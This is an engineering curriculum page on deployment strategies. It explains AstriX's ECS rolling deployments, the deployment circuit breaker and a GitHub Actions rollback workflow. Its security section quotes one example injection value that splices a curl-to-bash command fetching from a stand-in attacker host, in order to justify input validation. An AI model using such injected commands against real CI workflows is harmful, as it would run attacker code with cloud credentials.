# Deployment Strategies and Rollback

> Part of the [AstriX engineering curriculum](../Architecture.md), under [Infra](./00-master-infra-architecture.md).

Every previous file in this module answers "what infrastructure exists." This one answers a narrower but sharper question: when a new version of the backend or frontend is ready to go live, *how does traffic actually move from the old version to the new one*, and — just as important — what happens the moment someone discovers the new version was a mistake? [File 06](./06-compute-and-container-orchestration-ecs-fargate.md) already introduced ECS's deployment circuit breaker in passing, as one property of the ECS service resource among many; this file is the other half of that story — the full shape of AstriX's rollout strategy, the mechanics of both the automatic and the manual rollback paths, and the general landscape of deployment strategies a different codebase might have picked instead.

---

## 1. The Landscape

"How do you replace a running version of an application with a new one, without breaking things for whoever's using it right now" is a problem every deployed system has to solve, and the industry has converged on a small number of genuinely different answers. They differ along two axes that matter: whether the service stays available *during* the swap, and how much extra capacity the swap costs while it's happening.

### (a) Recreate

The simplest possible strategy: stop every instance of the old version, then start every instance of the new version. There is no moment where old and new code run side by side. A single-instance app deployed with `docker stop old && docker run new`, or a Kubernetes `Deployment` with `strategy.type: Recreate`, both do exactly this.

```yaml
# illustrative Kubernetes Deployment — not AstriX's actual config
spec:
  strategy:
    type: Recreate
```

The honest tradeoff is stark: it's the easiest strategy to reason about — there is never a moment where two different versions of your code are both live and potentially disagreeing about schema, API shape, or feature flags — but it guarantees a visible outage for every deploy, for however long it takes the new version to start and become ready. For a batch job or an internal tool with a tolerant audience, that's often a perfectly reasonable price. For anything a user might be actively using, it's rarely acceptable.

### (b) Rolling deployment

Replace instances a few at a time, keeping enough of the old version running throughout that the service as a whole never goes fully dark. A load balancer (or the orchestrator's own service discovery) only sends traffic to instances currently marked healthy, so as new instances come up and old ones are torn down, the pool serving traffic shrinks and grows but is never empty. This is the default behavior of ECS services (governed by the `deploymentConfiguration`'s minimum/maximum healthy percentages), and it's also Kubernetes's default `Deployment` strategy (`RollingUpdate`, governed by `maxUnavailable`/`maxSurge`).

```yaml
# illustrative Kubernetes rolling-update config — not AstriX's actual config
spec:
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxUnavailable: 1
      maxSurge: 1
```

The tradeoff here is the one every rolling deployment inherits: availability is preserved, but for the duration of the rollout, old and new code are genuinely running at the same time, receiving live traffic side by side. If the new version changed something the old version can't tolerate — a response shape, a shared cache format, a database column the old code still reads — that overlap window is exactly where it bites. It's also not free of downtime risk in the way blue-green is: if the new version is broken, some fraction of real requests hit the broken instances before anything notices and reacts.

### (c) Blue-green deployment

Stand up an entirely separate, fully-scaled second environment — "green" — running the new version, side by side with the live "blue" environment, without sending it any production traffic yet. Once green is confirmed healthy, traffic is cut over atomically: either by swapping which target group an ALB listener rule points at, by flipping a DNS record, or — for ECS specifically — via AWS CodeDeploy's native blue-green integration, which provisions a second task set behind a second target group and shifts the listener over once health checks pass.

```hcl
# illustrative ALB listener-rule cutover — not AstriX's actual config
resource "aws_lb_listener_rule" "cutover" {
  action {
    type             = "forward"
    target_group_arn = aws_lb_target_group.green.arn # was aws_lb_target_group.blue.arn
  }
}
```

The real benefit is qualitatively different from rolling deployment: rollback is instant and complete — cut the listener back to blue, and every single request is served by known-good code again, with zero instances of the new version ever having served a request the way a rolling deployment's transient bad instances did. The real cost is equally concrete: for the duration of the cutover, you are paying for two fully-scaled environments at once, and the added AWS surface (a second target group, CodeDeploy's own IAM permissions and hooks, or the DNS/listener-swap machinery) is genuine operational complexity that has to be built, tested, and maintained even when it isn't actively being exercised.

### (d) Canary deployment

Route a small percentage of real production traffic — 1%, 5%, 10% — to the new version first, watch real metrics (error rate, latency, business KPIs) against that live sample, and only then progressively widen the percentage toward 100% if the signal stays clean. Service meshes (Istio, Linkerd), API gateways with weighted routing, and managed services like AWS App Mesh or CodeDeploy's own canary/linear traffic-shifting configurations for Lambda and ECS all implement this shape.

```yaml
# illustrative Istio VirtualService traffic split — not AstriX's actual config
spec:
  http:
    - route:
        - destination: { host: api, subset: v1 }
          weight: 90
        - destination: { host: api, subset: v2 }
          weight: 10
```

The benefit canary deployment has that neither rolling nor blue-green fully replicates: it catches a bad deploy against a real, live sample of production traffic and production data patterns *before* the whole fleet — or even a fixed cutover moment — is exposed to it, which matters most for the class of bug that only shows up under real traffic shape (a slow memory leak, a rare input pattern, an interaction with real user data) rather than a simple health-check failure. The cost is infrastructure: something has to be capable of splitting live traffic by weighted percentage and something has to be watching real metrics closely enough, and fast enough, to decide whether to keep widening the canary or abort it — neither of which a plain load balancer or ECS service gives you for free.

*(Kubernetes deployments are the shape most of the illustrative snippets above borrow from — it's worth naming honestly as the industry's most common orchestrator for all four of these strategies, since a `Deployment`/`Rollout` resource combined with a service mesh or ingress controller is how a huge fraction of the industry implements rolling, blue-green, and canary alike. AstriX doesn't run on Kubernetes, and this file doesn't re-derive its mechanics — [file 06](./06-compute-and-container-orchestration-ecs-fargate.md) already covers that choice in its own landscape survey.)*

---

## 2. AstriX's Choice

AstriX uses ECS-native **rolling deployment**, configured through the ECS service's own `deploymentConfiguration`, with a **deployment circuit breaker** layered on top so that a rollout which can never reach a healthy steady state is detected and reverted automatically, with no human involved. That covers the automatic case. For the case a human needs to act — reverting to an arbitrary prior commit, days or weeks after the fact, for a bug the circuit breaker structurally cannot see — AstriX has a second, entirely separate mechanism: a manually-triggered `rollback.yml` GitHub Actions workflow that re-registers a new ECS task definition revision pointing at an old, known-good image. Neither blue-green nor canary deployment is implemented anywhere in this codebase; both are named here as real alternatives, not gaps to be fixed.

---

## 3. AstriX Implementation

### 3.1 The rolling-deployment configuration

The ECS service's rolling-deployment behavior is governed by two percentages, wired straight through from `terraform.tfvars`:

```hcl
# infra/environments/dev/terraform.tfvars:150-151
ecs_deployment_minimum_healthy_percent = 100
ecs_deployment_maximum_percent         = 200
```

```hcl
# infra/modules/ecs/main.tf:226-228
  # Deployment Configuration
  deployment_minimum_healthy_percent = var.deployment_minimum_healthy_percent
  deployment_maximum_percent         = var.deployment_maximum_percent
```

With `desired_count` tasks running (set elsewhere in the module, independent of these two knobs), a `minimum_healthy_percent` of 100 means ECS is never allowed to let the healthy task count drop below 100% of desired during a deployment — every currently-healthy old task must stay up until a replacement new task is confirmed healthy. A `maximum_percent` of 200 means ECS is allowed to *temporarily double* the task count, launching new tasks alongside every existing one, before starting to tear the old ones down. Put together: with `desired_count = 2`, a deploy briefly runs up to 4 tasks (2 old + 2 new), and at no point does the fleet ever have fewer than 2 healthy tasks. This is the textbook shape of strategy (b) above — the service is fully available throughout, at the cost of doubling task capacity for the brief window each deployment takes to complete.

### 3.2 The deployment circuit breaker

```hcl
# infra/modules/ecs/main.tf:251-256
  # Deployment Circuit Breakerdc
  # Automatically roll back failed deployments
  deployment_circuit_breaker {
    enable   = true
    rollback = true
  }
```

`enable = true` turns on ECS's own internal tracking of whether a deployment is making progress toward a healthy steady state; `rollback = true` is the part that matters most here — it tells ECS that if that internal tracking concludes the new deployment can never succeed (new tasks keep failing their health checks, or keep exiting, past ECS's own threshold for consecutive failures), ECS should automatically stop trying to promote the new revision and instead redeploy the previous, last-known-good task definition revision on its own. No workflow, no human, no external system is involved in that decision — it's a property of the ECS service resource itself, evaluated by the ECS control plane.

### 3.3 Why the running image isn't Terraform's problem after the first `apply`

```hcl
# infra/modules/ecs/main.tf:194-204
  # CI (deploy-backend.yml force-new-deployment against the ":latest" tag,
  # and rollback.yml registering a commit-SHA-pinned revision directly) owns
  # the running image after the first apply - not Terraform. Without this,
  # the next `terraform apply` re-registers a revision pointing at whatever
  # ":latest" currently resolves to in ECR, silently undoing any rollback.
  # Terraform still owns everything else about the task def (CPU/memory,
  # secrets wiring, log config, health check).
  lifecycle {
    ignore_changes = [container_definitions]
  }
```

This block is the load-bearing seam between infrastructure-as-code and CI/CD, and it's worth citing directly here rather than only in [file 06](./06-compute-and-container-orchestration-ecs-fargate.md), because both deploy and rollback depend on it. Once the task definition exists, Terraform stops touching `container_definitions` entirely — every subsequent `terraform apply` leaves whatever image is currently registered alone. That's what makes it safe for `deploy-backend.yml` and `rollback.yml` to mutate the running task definition out from under Terraform's own state: if this `ignore_changes` weren't here, the next infra apply would blow away a manual rollback by re-registering a revision against whatever `:latest` happens to resolve to in ECR at that moment.

### 3.4 `rollback.yml` — input validation

```yaml
# .github/workflows/rollback.yml:26-36
jobs:
  validate-input:
    name: Validate commit_sha
    runs-on: ubuntu-latest
    steps:
      - name: Check commit_sha looks like a git SHA
        run: |
          if ! [[ "${{ inputs.commit_sha }}" =~ ^[0-9a-f]{7,40}$ ]]; then
            echo "::error::commit_sha must be a 7-40 character hex git SHA, got: '${{ inputs.commit_sha }}'"
            exit 1
          fi
```

Both `rollback-backend` and `rollback-frontend` declare `needs: validate-input`, so neither job's steps run at all unless this regex passes first.

### 3.5 `rollback-backend` — check, rebuild-if-missing, re-register, deploy, wait

```yaml
# .github/workflows/rollback.yml:67-76
      - name: Check if image exists
        id: check-image
        env:
          ECR_REGISTRY: ${{ steps.login-ecr.outputs.registry }}
        run: |
          if aws ecr describe-images --repository-name $ECR_REPOSITORY --image-ids imageTag=${{ inputs.commit_sha }} 2>/dev/null; then
            echo "exists=true" >> $GITHUB_OUTPUT
          else
            echo "exists=false" >> $GITHUB_OUTPUT
          fi
```

```yaml
# .github/workflows/rollback.yml:78-86
      - name: Build and push image (if not exists)
        if: steps.check-image.outputs.exists == 'false'
        working-directory: backend
        env:
          ECR_REGISTRY: ${{ steps.login-ecr.outputs.registry }}
        run: |
          echo "Image not found in ECR, rebuilding from commit..."
          docker build -t $ECR_REGISTRY/$ECR_REPOSITORY:${{ inputs.commit_sha }} .
          docker push $ECR_REGISTRY/$ECR_REPOSITORY:${{ inputs.commit_sha }}
```

Then the piece that actually performs the rollback:

```yaml
# .github/workflows/rollback.yml:88-106
      - name: Update ECS task definition with rollback image
        env:
          ECR_REGISTRY: ${{ steps.login-ecr.outputs.registry }}
        run: |
          # Get current task definition
          TASK_DEF=$(aws ecs describe-task-definition --task-definition astrix-dev-backend --query 'taskDefinition')
          
          # Update image in task definition
          NEW_TASK_DEF=$(echo $TASK_DEF | jq --arg IMAGE "$ECR_REGISTRY/$ECR_REPOSITORY:${{ inputs.commit_sha }}" \
            '.containerDefinitions[0].image = $IMAGE | del(.taskDefinitionArn, .revision, .status, .requiresAttributes, .compatibilities, .registeredAt, .registeredBy)')
          
          # Register new task definition
          aws ecs register-task-definition --cli-input-json "$NEW_TASK_DEF"
          
          # Update service
          aws ecs update-service \
            --cluster $ECS_CLUSTER \
            --service $ECS_SERVICE \
            --force-new-deployment
```

Walking through what that `jq` line actually does, since it's the crux of the whole workflow:

- `aws ecs describe-task-definition --task-definition astrix-dev-backend --query 'taskDefinition'` fetches the *currently active* task definition — whatever revision the family `astrix-dev-backend` is on right now, not any historical revision — as a single JSON object.
- `jq --arg IMAGE "..." '.containerDefinitions[0].image = $IMAGE | ...'` takes that JSON, and surgically overwrites exactly one field: the `image` string on the first (and only) container definition. Nothing else about the task definition — CPU, memory, secrets, log configuration, health check — is touched by this line.
- `| del(.taskDefinitionArn, .revision, .status, .requiresAttributes, .compatibilities, .registeredAt, .registeredBy)` strips the fields AWS itself generates and returns on a `describe-task-definition` call but refuses to accept back on a `register-task-definition` call — an ARN, a revision number, a status, and so on are all outputs of registration, not inputs to it. Without this `del(...)`, the subsequent `register-task-definition --cli-input-json` call would fail outright, because you can't tell AWS what revision number or ARN a not-yet-created revision should have.
- `aws ecs register-task-definition --cli-input-json "$NEW_TASK_DEF"` submits that trimmed, image-swapped JSON as a brand-new task definition. ECS auto-increments the revision number for the family and returns a new ARN.
- `aws ecs update-service ... --force-new-deployment` then tells the ECS service to converge on the family's latest revision — the one just registered — and roll new tasks out under the exact same rolling-deployment configuration and circuit breaker described in §3.1–3.2.

```yaml
# .github/workflows/rollback.yml:108-114
      - name: Wait for service stability
        run: |
          echo "Waiting for ECS service to stabilize..."
          aws ecs wait services-stable \
            --cluster $ECS_CLUSTER \
            --services $ECS_SERVICE
          echo "✅ Backend rollback complete!"
```

### 3.6 `rollback-frontend` — rebuild-from-ref, resync, invalidate

The frontend has no registry of pre-built artifacts pinned to a commit the way the backend has ECR images tagged by SHA — a frontend "deploy" is just a static build synced to S3 — so its rollback path is simpler in shape: check out the target commit and rebuild from scratch.

```yaml
# .github/workflows/rollback.yml:125-127
      - uses: actions/checkout@v4
        with:
          ref: ${{ inputs.commit_sha }}
```

```yaml
# .github/workflows/rollback.yml:162-175
      - name: Install dependencies
        working-directory: client
        run: npm ci

      - name: Build
        working-directory: client
        run: npm run build
        env:
          VITE_API_BASE_URL: ${{ steps.ssm.outputs.api_url }}

      - name: Sync to S3
        working-directory: client
        run: |
          aws s3 sync dist/ s3://$S3_BUCKET/ --delete
```

```yaml
# .github/workflows/rollback.yml:177-181
      - name: Invalidate CloudFront
        run: |
          aws cloudfront create-invalidation \
            --distribution-id ${{ steps.cloudfront.outputs.distribution_id }} \
            --paths "/*"
          echo "✅ Frontend rollback complete!"
```

There's no "check if the build already exists" step here at all — every frontend rollback is a full, fresh `npm ci && npm run build` from the target commit, every time, followed by an `s3 sync --delete` (which removes any file in the bucket not present in the new build) and a full-path CloudFront invalidation to force edge caches to fetch the rolled-back assets instead of serving stale cached copies of the version being rolled back from.

---

## 4. Request/Data Flow

### 4.1 The automatic path — a bad deploy catches itself

1. A commit lands on `main` touching `backend/**`, triggering `deploy-backend.yml`. It builds and pushes a new image tagged both `:$GITHUB_SHA` and `:latest` (`.github/workflows/deploy-backend.yml:44-54`), waits on the ECR scan, then runs `aws ecs update-service --force-new-deployment` (`deploy-backend.yml:89-94`) — notably, *without* registering a new task definition revision at all, since the task definition (Terraform-managed, `ignore_changes = [container_definitions]`) already points at the floating `:latest` tag; `force-new-deployment` just tells ECS to restart tasks against whatever `:latest` currently resolves to in ECR.
2. ECS begins the rolling deployment described in §3.1: with `deployment_minimum_healthy_percent = 100` and `deployment_maximum_percent = 200`, it launches new tasks on the new image alongside the still-running old tasks, never dropping below full healthy capacity.
3. Suppose the new image has a real defect — a crash on startup, a missing environment dependency, an endpoint that never becomes healthy. The container-level `healthCheck` (`infra/modules/ecs/main.tf:176-182`) starts failing once its 60-second `startPeriod` grace window elapses, and after `retries: 3` consecutive failures at a 30-second `interval`, ECS marks the new tasks unhealthy.
4. Because `deployment_circuit_breaker { enable = true, rollback = true }` is set, ECS's own deployment tracking recognizes that this deployment cannot reach a healthy steady state within its internal failure threshold, marks the deployment failed, and **automatically re-deploys the previous, last-known-good task definition revision** in its place — reverting the service to the state it was in before step 1 ever ran.
5. The original old tasks were never torn down (that's exactly what `minimum_healthy_percent = 100` guaranteed), so real user traffic never touched a fully-down service. From outside, a caught bad deploy looks like nothing happened. No workflow run, no human, and no external tool ever gets involved in this sequence — it is entirely internal to the ECS control plane reacting to its own health-check signal.

### 4.2 The manual path — a human rolls back an arbitrary prior commit

1. Days (or weeks) later, someone notices a problem in production that was **not** caught by the automatic path above — meaning the bad deploy passed its health checks and has been serving traffic successfully the entire time. A human decides which prior commit was last known-good and triggers `rollback.yml` via `workflow_dispatch`, filling in `target: backend` (or `frontend`, or `both`) and `commit_sha` (`.github/workflows/rollback.yml:4-17`).
2. The workflow's `validate-input` job runs first (§3.4): the `commit_sha` string is checked against `^[0-9a-f]{7,40}$` before anything else executes. If it fails, the run stops here — neither `rollback-backend` nor `rollback-frontend` starts, since both declare `needs: validate-input`.
3. `rollback-backend` starts (gated behind the `production` GitHub Environment's approval requirement, same as every deploy workflow — see [file 12](./12-cicd-with-github-actions.md)), checks out the exact target commit, authenticates to AWS via OIDC, and logs into ECR.
4. It checks whether an image already exists in ECR tagged with that exact commit SHA (`rollback.yml:67-76`) — true only if `deploy-backend.yml` already built and pushed that commit as part of a normal deploy at some point in the past. If no such image exists (the target commit was, say, never actually deployed on its own — perhaps it was squashed into a later deploy, or the rollback target predates ECR's retention window), the workflow rebuilds the image fresh from that exact checked-out commit and pushes it under that SHA tag (`rollback.yml:78-86`).
5. The workflow fetches the **currently active** task definition (not any historical revision), swaps only its container `image` field to point at the SHA-tagged image, strips the AWS-generated metadata fields, and registers the result as a brand-new task definition revision (`rollback.yml:88-100`, walked through in full in §3.5).
6. It force-deploys that new revision (`rollback.yml:102-106`) and the ECS service performs the exact same rolling deployment described in §3.1 — new tasks on the rolled-back image come up alongside the currently-running (buggy) tasks, replacing them only once healthy, under the same circuit-breaker protection from §3.2. (If the rollback image itself somehow fails health checks, the circuit breaker would trigger *again*, reverting to whatever was running immediately before the rollback attempt — the two mechanisms compose rather than conflict.)
7. The workflow waits for `services-stable` (`rollback.yml:108-114`) before reporting success. If `target: frontend` or `target: both` was selected, `rollback-frontend` runs in parallel, checking out the same commit, rebuilding the static site from scratch, resyncing S3, and invalidating CloudFront (§3.6) — an entirely independent mechanism from the backend path, since a static frontend build has no "task definition" concept to mutate.

---

## 5. Design Decisions & Tradeoffs

**Why both a circuit breaker and a manual workflow.** These two mechanisms are not redundant — they catch structurally different classes of failure. The circuit breaker's only signal is the container-level `healthCheck`: a process that starts, binds its port, and answers the health-check path correctly is "healthy" as far as ECS is concerned, full stop. That means the circuit breaker is fast and requires zero human attention, but it is structurally blind to any bug that doesn't manifest as a failed health check — a logic error that returns wrong data instead of an error code, a subtly broken feature, a performance regression, a security flaw. Those are exactly the class of problem `rollback.yml` exists to fix: it doesn't need the new version to be *unhealthy*, only for a human to have noticed something is *wrong*.

**Why the rollback re-registers a new task definition revision instead of pointing the service back at the old revision's ARN.** This is worth stating precisely, because the actual behavior in the code is more specific than "revert to the old revision." AWS *does* support pointing an ECS service directly at a specific historical revision ARN (`aws ecs update-service --task-definition family:N`) without registering anything new — `rollback.yml` doesn't do that. Instead, per the `jq` walkthrough in §3.5, it fetches the *currently active* task definition (whatever revision the family is on right now, which may have drifted from what was running at the target commit's time — a Terraform-applied CPU/memory bump, a new secret added to the container, and so on all flow through the family's live revision independent of the app's own deploys), and grafts *only* the container image onto that current template before registering it as new. The practical effect: a manual rollback reverts the application code to the target commit's image, while deliberately preserving whatever the task definition's other fields currently are — it does not undo any infrastructure-side changes to CPU, memory, secrets wiring, or logging configuration that happened to land between the target commit and now. That's a real and mostly sensible property for a tool whose job is "put the old *code* back," not "time-travel the whole task definition back to what it looked like on that date" — the two are different operations, and only the first is guaranteed to be safe to run blind. It does mean a rollback cannot undo a genuinely bad infra-side change to the task definition itself; that's outside this workflow's scope by construction, not an oversight.

**Why rebuild-if-missing, at the cost of a slower rollback.** The check-then-rebuild pattern in §3.5 is a deliberate resilience choice: rather than requiring every historical commit to already have an ECR image available (which would mean either never expiring old images — directly at odds with [file 05](./05-container-registry-and-image-lifecycle.md)'s lifecycle/retention policy — or the rollback simply failing outright for an old-enough target), the workflow accepts a slower rollback in the uncommon case where the target commit's image has aged out, in exchange for the rollback command *always* being usable for any valid commit SHA on the branch, regardless of how long ago it landed.

---

## 6. Security Considerations

**The `commit_sha` regex is an input-sanitization control, not a formatting nicety.** `commit_sha` is a free-text `workflow_dispatch` input — anyone with permission to trigger the workflow can type anything into it — and it gets interpolated directly into shell `run:` blocks via `${{ inputs.commit_sha }}` (for example, `imageTag=${{ inputs.commit_sha }}` at `rollback.yml:72`, and inside the `jq --arg IMAGE "...:${{ inputs.commit_sha }}"` string at `rollback.yml:96`) and passed as a `ref:` to `actions/checkout`. GitHub Actions performs `${{ }}` substitution as a literal text splice *before* the shell ever parses the line — the substituted value is not automatically quoted or escaped for shell safety. Without the `^[0-9a-f]{7,40}$` check gating every downstream job, a value like `` `; curl https://evil.example/x.sh | bash #` `` typed into that input would be spliced into the `run:` script verbatim, and the shell would execute it as a second command chained after the intended one — a classic GitHub Actions script-injection vector, running with whatever AWS credentials that job's OIDC role just assumed. Restricting the input to a fixed-length hex pattern before any of the SHA-consuming jobs runs closes that off entirely: a string that matches `^[0-9a-f]{7,40}$` contains no shell metacharacters at all, by construction.

**The production Environment gate applies here too.** Both `rollback-backend` and `rollback-frontend` declare `environment: production` (`rollback.yml:47`, `:121`), the same GitHub Environment mechanism [file 12](./12-cicd-with-github-actions.md) covers in depth for the ordinary deploy workflows — a rollback rewrites what's actually serving live traffic exactly as much as a forward deploy does, so it's correct that it isn't exempt from the same required-reviewer approval step.

**A rollback can silently undo a security fix, not just a feature bug.** This deserves stating as a general principle beyond this specific workflow: rolling back to an arbitrary earlier commit reverts *everything* that changed between that commit and now — including any security patch, dependency bump, or access-control fix that happened to land in between, for reasons entirely unrelated to whatever the rollback is trying to fix. A team using a tool shaped like this one should treat "what security-relevant commits exist between the rollback target and HEAD" as a real question to ask before pulling the trigger on an old SHA, not an edge case — the further back the target commit, the larger that exposure window becomes.

---

## 7. Best Practice Check

ECS's built-in rolling deployment plus a deployment circuit breaker remains a solid, current 2026-standard baseline — this is precisely the configuration AWS itself recommends for ECS services, and most mature ECS deployments run with it enabled rather than treating it as an advanced option. Nothing about this pattern is dated.

Blue-green or canary deployment is a reasonable *future* step for AstriX, not a gap at its current scale. Both add real value — instant, complete rollback for blue-green; exposure to only a slice of real traffic before a bad deploy goes wide for canary — but both also add real infrastructure and operational cost (a second fully-scaled environment, or a traffic-splitting layer and the metric-watching automation to drive it) that's easiest to justify once a service has enough traffic, enough blast radius per incident, or enough deploy frequency that the rolling-deployment-plus-circuit-breaker baseline is visibly not enough.

A manual, human-triggered rollback workflow is a reasonable choice at this scale, not a shortcut. The more advanced 2026 pattern some larger organizations run instead is automatic, alarm-triggered rollback — wiring a CloudWatch alarm (elevated 5xx rate, latency regression, a custom business metric) directly to an automated rollback action (AWS CodeDeploy supports this natively for ECS blue-green deployments; some orgs build the equivalent with EventBridge + Lambda), so that a bad deploy the circuit breaker's health check can't see gets reverted within minutes instead of waiting for a human to notice. That pattern is genuinely more advanced infrastructure to build and trust, and reasonable teams delay it until the cost of a human-in-the-loop rollback (measured in minutes-to-hours of a subtly broken deploy being live) starts to outweigh the cost of building and maintaining automated alarm-driven rollback.

---

## 8. Debug Drill

**Scenario:** A manual rollback via `rollback.yml` completes successfully — every step is green in the GitHub Actions run, "Backend rollback complete!" prints, `services-stable` returned without error — but the bug it was supposed to fix is still showing up in production. Where do you look, and in what order?

1. **Confirm the right target actually ran.** `target` is a three-way choice (`backend`/`frontend`/`both`) — if the bug is a frontend-visible symptom of a backend bug (or vice versa) and only one side was selected, the workflow did exactly what was asked and nothing more. Check the run's inputs before assuming the mechanism itself failed.

2. **Confirm the deployed task definition revision actually changed.** `aws ecs describe-services --cluster astrix-dev-cluster --services astrix-dev-backend-service --query 'services[0].taskDefinition'` shows exactly which revision ARN is live right now. Compare its revision number to what it was before the rollback ran — if it's unchanged, `register-task-definition` or `update-service` silently didn't produce the effect expected (worth checking the workflow's own logs for the `jq` output and the `register-task-definition` response before assuming AWS state is wrong).

3. **Confirm the tasks actually cycled, not just the service definition.** A successful `update-service --force-new-deployment` call still has to actually replace running tasks — check `aws ecs list-tasks` and the `startedAt` timestamp on each task against when the rollback ran. If old tasks are still running past when the rollback completed, something (a stuck deployment, tasks that never passed health checks and got quietly retried, connection draining taking longer than expected) is keeping them alive, and the ALB may still be routing some fraction of traffic to them.

4. **Confirm it's the right commit, and the right image.** `aws ecs describe-task-definition` on the currently active revision shows the exact image URI, tag included — cross-check that tag against the `commit_sha` that was actually typed into the workflow's input, not the commit the human *intended* to target. A rollback to the wrong SHA (a typo, an off-by-one on which commit was actually "last known good," or a target commit that itself didn't yet contain the fix) will run flawlessly and change nothing about the underlying problem.

5. **Rule out caching, for a frontend rollback specifically.** A successful `rollback-frontend` run syncs new files to S3 and invalidates CloudFront's entire `/*` path — but a CloudFront invalidation can take several minutes to fully propagate across edge locations, and a browser or intermediate proxy cache can still be serving a locally-cached copy of the old bundle regardless of what CloudFront now holds. Hard-refresh from a private browsing window, or check the response's `x-cache` header directly against CloudFront, before concluding the rollback itself failed.

6. **Only then, suspect the workflow's own logic.** If all of the above check out — right target, right revision live, tasks actually cycled, right commit's image, caches cleared — and the symptom persists, the remaining possibility is that the bug was never actually introduced by application code at all: a data migration that already ran and isn't undone by a code rollback, a stateful record written by the buggy version that the rolled-back code now reads and mishandles differently, or an external dependency (a third-party API, a feature flag service) that changed independently of this deploy. A code rollback only reverts code — it cannot retroactively undo effects the buggy version already had on persistent state.
